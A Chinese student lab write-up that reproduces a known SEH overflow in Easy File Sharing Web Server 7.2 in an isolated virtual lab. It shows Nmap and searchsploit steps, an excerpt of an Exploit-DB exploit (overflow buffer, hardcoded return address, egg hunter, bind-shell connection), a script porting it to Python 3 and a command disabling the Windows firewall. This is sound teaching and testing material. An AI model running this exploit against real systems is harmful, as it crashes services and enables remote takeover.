---
title: 网络渗透测试作业：漏洞扫描实例复现（Nmap 发现 → searchsploit 检索 → Python 溢出）
date: 2026-11-11 15:10:00
categories:
  - 学习笔记
tags:
  - 网络安全
  - 网络渗透测试
  - 漏洞扫描
---

这学期 Web 安全课第 5 章讲「漏洞扫描 - 实例」，课件里把一整套流程演示了一遍：先用 Nmap 扫出目标主机上跑着 Easy File Sharing Web Server（下面简称 EFSWS），再用 Kali 自带的 searchsploit 找这个软件的公开利用代码，最后用 Python 脚本发一次 SEH 缓冲区溢出，看漏洞是不是真的存在。

我按这个顺序自己复现了一遍，中间最麻烦的不是扫描和攻击本身，而是把一个 2016 年的 Python 2 脚本改成能在 Python 3 上跑。整个实验都在 VMware 仅主机网络（VMnet1）里做，靶机是新建的虚拟机，跟公网完全隔离，文中涉及地址的地方都用占位符代替。

<!-- more -->

## 一、实验环境

| 角色 | 系统 / 工具 | 说明 |
|---|---|---|
| 攻击机 | Kali Linux（Nmap、searchsploit、Python 3） | 与靶机同在 VMnet1 仅主机网络 |
| 靶机 | Windows 10 企业版 LTSC 2019 x64（用户名 target） | 全新虚拟机，简易安装自动装好 VMware Tools |
| 目标软件 | Easy File Sharing Web Server 7.2（`efssetup_20181`） | 监听 TCP 80，未注册试用版功能完整 |
| 利用代码 | Exploit-DB 40178.py（SEH Overflow + Egghunter，DEP Bypass） | 官方标注 Tested on Windows 7 / 8 / 8.1 / 10 |
| 网络 | VMware Host-only（VMnet1） | 靶机防火墙三个配置文件已全部关闭 |

课件演示的靶机是装了 EFSWS 的 Windows 主机，我这边用的是 Win10 企业版 LTSC 2019 虚拟机——这个版本不需要 TPM 和安全启动，装起来省事，软件版本和课件一致，攻击链路也一样。这软件本身是已知存在远程溢出漏洞的老版本，所以只装在隔离的虚拟机里，物理机上不敢开这个服务。

## 二、先弄明白几个东西

- **SEH**：结构化异常处理，Windows 里程序出错时的一套兜底机制，出错后系统会顺着一条链去找「谁来处理这个异常」。要是把这条链上的地址覆盖掉，程序出异常时就会跳到我们指定的地方去执行——这就是 SEH 溢出。
- **硬编码返回地址**：`0x10019ce3`，指向 7.2 自带、既没开 ASLR 也没开 SafeSEH 的 `ImageLoad.dll`。地址是写死的，所以这个 PoC 只对 7.2 这一个版本有效，换到修好的新版就失效了。
- **egg hunter**：直译「找蛋器」。缓冲区空间有限，塞不下完整的 shellcode，就先用一小段代码取得执行权，让它去内存里搜一个标记（这里是 `hivehive`），搜到了再跳到真正的 shellcode 上。
- **DEP**：数据执行保护，让栈和堆上的数据不能当代码跑。egg hunter 配标记的办法正好绕开它——shellcode 藏在别的地方，不在那段被保护的数据里。
- **bind shell**：让靶机自己开一个端口等着别人连进来。这个 PoC 里是 54321 端口，脚本最后会用 `ncat` 去连。

顺便记一个很容易看错的点：Nmap 的 `-sV` 显示 `httpd 6.9`，跟实际装的 7.2 对不上。`-sV` 是拿 HTTP 响应头里 `Server:` 那行的 banner 去匹配的，这类老软件的 banner 常年不更新，所以显示 6.9 不代表真的是 6.9。我核对了安装包 `efssetup_20181`（3.7 MB、2015-10-15），确实是官方 7.2；而且 6.9 和 7.2 都存在同一种溢出缺陷，不影响后面的验证。

## 三、实验步骤

### 3.1 把靶机和服务准备好

在 VMware 里新建 Win10 虚拟机、挂官方 ISO，简易安装会自动分区、装系统、装 VMware Tools。进桌面后先关防火墙：

```bat
netsh advfirewall set allprofiles state off
```

这行要以管理员身份运行，它把域、专用、公用三个配置文件一起关掉。不关的话 Nmap 扫不到，反弹连接也回不来。我只关了防火墙，Defender 的实时保护没动。

然后装 EFSWS 并启动，试用框点「确定 / Try it!」就行，不用注册。启动后主界面 Port 是 80，Start 变灰、Stop 亮起，底部显示 `Web Server is online`。在靶机浏览器里打开 `http://127.0.0.1/`，出现 User Login 登录页，说明网站能被正常访问。这张截图是后面判断「到底打崩了没有」的基准，所以我留了它。

![攻击前：靶机 IE 打开 127.0.0.1，显示 EFSWS 的 User Login 登录页](/img/07_before_login.png)

LTSC 2019 不带 Edge，桌面上也找不到浏览器图标，我是用 `Win + R` 直接输网址，在弹出的「你要如何打开此文件」里选 Internet Explorer。

### 3.2 Nmap 扫一下

Kali 终端里执行（`<靶机IP>` 是靶机 `ipconfig` 查到的，纯数字）：

```bash
nmap -sV -p 80 <靶机IP>
```

回显里有 `Host is up`、`80/tcp open http`、`Easy File Sharing Web Server httpd 6.9`、`Service Info: OS: Windows`。课件第 3 页「用 Nmap 扫描发现目标主机运行了该软件」，到这一步就算做完了。

![Nmap 扫描结果：80/tcp open，识别出 Easy File Sharing Web Server](/img/01_nmap.png)

### 3.3 searchsploit 找利用代码

```bash
searchsploit easy file sharing
```

返回 30 多条，大部分是 EFSWS 7.2 的缓冲区溢出 PoC，另外还有几条标着 `(Metasploit)` 的 `.rb`，对应课本 7-4 那个模块。

![searchsploit 列出的 EFSWS 相关条目](/img/02_searchsploit.png)

关键词必须带空格。exploit-db 里的标题写的是 `Easy File Sharing Web Server`，连写成 `easyfilesharing` 会直接返回 `No Results`。另外结果里那句 `Shellcodes: No Results` 是正常的，searchsploit 每次会同时搜 Exploits 和 Shellcodes 两个库。

### 3.4 把 PoC 拷下来读一遍

```bash
searchsploit -m 40178
head -60 40178.py
tail -n 50 40178.py
```

我选的是 `40178.py`（`Easy File Sharing Web Server 7.2 - SEH Overflow with Egghunter`），带 DEP 绕过，跟课本 7-4 那个 Metasploit 模块打的是同一个 SEH 洞。文件头注释写着 `Version: 7.2`、`Tested on: Windows 7, 8, 8.1, 10`，用法是 `python 40178.py <靶机IP>`，端口写死 80。

结尾那段是整个攻击逻辑的关键：

```python
crash = "A" * 4061
crash += pack('<L', 0x909006eb)          # SEH 覆盖：短跳转
crash += pack('<L', 0x10019ce3)          # 硬编码返回地址
crash += "D" * (5500 - 4061 - 8 - len(egghnter))
payload = 'GET {} HTTP/1.0\r\n\r\n'.format(crash)
payload += 'L' + 'hivehive'               # egg hunter 要搜索的标记
payload += rekt                           # 真正的 shellcode
payload += 'E' * (800 - len(rekt))
s.send(payload)
sleep(2)
call(['ncat', host, '54321'])             # 连接靶机 54321 的 bind shell
```

先拿 4061 个 `A` 把缓冲区顶满，再用短跳转覆盖 SEH，落在硬编码的返回地址上；后面接 egg hunter 和真正的 shellcode，发出去之后等 2 秒去连 54321。

### 3.5 改成 Python 3 能跑的

这个 PoC 首行写的是 `#!/usr/bin/python`，2016 年的 Python 2 脚本，而 Kali 现在只有 Python 3。直接 `python3 40178.py` 肯定报错，一共三处不兼容：

| # | Python 2 写法 | Python 3 下的问题 | 处理办法 |
|---|---|---|---|
| 1 | `print '[...]'`（共 6 处） | 语法错误，print 已经是函数 | 改成 `print('...')` |
| 2 | `"A" * 4061 + pack('<L', ...)` | `struct.pack` 返回 bytes，不能和 str 拼 | 让 pack 的结果按 latin-1 解码成 str，字节值 1:1 不变 |
| 3 | `s.send(payload)` | `socket.send` 只接受 bytes | 发送前用 `payload.encode('latin-1')` 还原成原始字节 |

我不想逐行手改那几百行 shellcode（少一个字节偏移就全错），所以写了个自动转换脚本：读原文件、正则替换这三类写法，生成 `poc.py`，shellcode、偏移量、payload 布局一个字节都不动。

```python
# 1) print 语句 -> print() 函数
s = re.sub(r"(?m)^([ \t]*)print ([^\n]*)$",
           lambda m: m.group(1) + "print(" + m.group(2) + ")", s)
# 2) struct.pack 返回 latin-1 字符串，保证偏移量与字节值不变
s = re.sub(r"pack\(['\"]<L['\"],\s*(0[xX][0-9a-fA-F]+)\)",
           r"_pack('<L', \1).decode('latin-1')", s)
# 3) 发送前编码回原始字节
s = re.sub(r"(?m)^([ \t]*)s\.send\(payload\)([ \t]*)$",
           r'\1s.send(payload.encode("latin-1"))\2', s)
```

转换完对了个数：`print` 6 处、`pack` 2 处、`send` 1 处，`py_compile` 语法检查通过。生成的 payload 是 **6312 字节**（5500 + 800 + 12 字节的 GET 头），跟原始布局完全对得上，`hivehive` 标记、短跳 `eb 06 90 90`、返回地址 `e3 9c 01 10` 都还在。

```bash
python3 fix_40178.py     # 读同目录的 40178.py，生成 poc.py
python3 poc.py <靶机IP>
```

### 3.6 打一发，看结果

运行输出就三行：

```text
[+] Trying to exploit ...
[!] Whoops!! Something went wrong?
[+] I <3 SHELLS
```

![python3 poc.py 的运行输出](/img/08_exploit_run.png)

这三行不能想当然地读。`[!] Whoops!!` 在脚本里被内外两层 `except` 共用，可能是「连不上靶机 80」，也可能是「payload 已经发出去了，但 2 秒后 ncat 连不上 54321」；而 `[+] I <3 SHELLS` 写在 `finally` 里，成功失败都会打印，不能当成功标志。

我一开始就是被最后这行骗了，以为已经拿到 shell 了。真正靠得住的判据只有一个：靶机服务的前后状态对比。攻击前 `http://127.0.0.1/` 还能正常显示 User Login，攻击后刷新，IE 直接报「未连接到网络」，说明 EFSWS 进程已经被溢出打崩了：

![攻击后：同一地址刷新变成「未连接到网络」，EFSWS 已崩溃](/img/09_after_crash.png)

## 四、结果与分析

| 验证项 | 结果 | 结论 |
|---|---|---|
| 服务发现 | Nmap 报 `80/tcp open` + EFSWS banner | 目标主机确实跑着这个软件 |
| 利用可得性 | searchsploit 返回 30+ 条 EFSWS 7.2 利用 | 漏洞公开、可复现 |
| PoC 可执行 | 转换后语法检查通过，payload 6312 字节与原始一致 | 兼容性改造没破坏利用逻辑 |
| 攻击生效 | 靶机 80 端口由可访问变成「未连接到网络」 | **SEH 溢出成功，漏洞确认存在** |
| 交互式 shell | ncat 没连上 54321 | Win10 上 DEP / ROP 链没能稳定建立 bind shell，不影响漏洞验证 |

一次约 6 KB 的畸形 GET 请求，就能让一个正常对外提供服务的进程彻底崩掉，说明这软件对输入长度根本不做边界检查。要是攻击者的 shellcode 跟目标系统版本完全匹配，那个崩溃点就会变成任意代码执行点，危害从「拒绝服务」直接升到「完全控制」。

这也正好解释了课件为什么把这个例子当成「漏洞扫描 → 利用验证」的标准闭环：扫描只能告诉你版本号，真正的风险得靠一次受控的利用测试才能确认。

## 五、踩到的坑

| 现象 | 原因 | 解决办法 |
|---|---|---|
| Nmap 显示 `httpd 6.9`，跟 7.2 不符 | `-sV` 按 HTTP Server banner 匹配，老软件 banner 没更新 | 以安装包实际版本为准，必要时在 EFSWS 主界面点 About 核对 |
| `searchsploit easyfilesharing` 返回 No Results | 标题里 `Easy File Sharing` 带空格，连写匹配不到 | 改成 `searchsploit easy file sharing` |
| `python3 40178.py` 语法 / 类型报错 | 2016 年的 Python 2 脚本，print / bytes / send 三处不兼容 | 用自动转换脚本生成 poc.py，不逐行手改 shellcode |
| `cd-` 报「找不到命令」并列一堆 debian 包名 | 把 `cd ~` 敲成了 `cd-`（少个空格） | 这步本来就能省（已经在文件所在目录）；也别照提示去 apt 装包 |
| `[!] Whoops!! Something went wrong?` | 内层 except：ncat 连不上 54321；或外层 except：连不上 80 | 以「靶机服务崩没崩」为唯一判据，也可以往上滚看有没有出现过 `Sending payload` |
| `[+] I <3 SHELLS` 却没拿到 shell | 这行写在 finally 里，无条件执行 | 不要把它当成功标志 |
| 靶机 LTSC 桌面找不到浏览器 | 企业 LTSC 精简版不带 Edge，IE11 也没有桌面快捷方式 | `Win + R` 直接输网址，选 Internet Explorer 打开 |
| Win10 上没弹计算器 / 没拿到 shell | 新系统的 DEP、ASLR、UWP 应用等保护影响老 ROP 链 | 以服务崩溃作为漏洞验证证据；需要交互式控制就改用 Metasploit 的 `easyfilesharing_seh` 模块 |

## 六、小结

这次把课件演示的「Nmap 发现目标 → searchsploit 检索利用 → Python 脚本实施攻击」三步走通了，最后是用攻击前后服务状态的对比，证实了 EFSWS 7.2 的 SEH 溢出漏洞确实存在。

做完感觉最有价值的不是那几条命令，而是认识到老公开 PoC 和新系统之间隔着好几层东西：语言版本、依赖、防护机制，一层对不上就跑不起来。Python 2 到 3 得自己做个自动转换、banner 显示的版本不等于实际版本、Win10 上 bind shell 打不通，这些都得先分析再动手，照着命令硬敲只会一路报错。

站在防守的一边看，结论反而挺简单：及时升级到修好的版本，给服务进程开上 DEP / ASLR，再在网络层限制管理端口暴露，这类依赖硬编码地址的利用基本就废了。
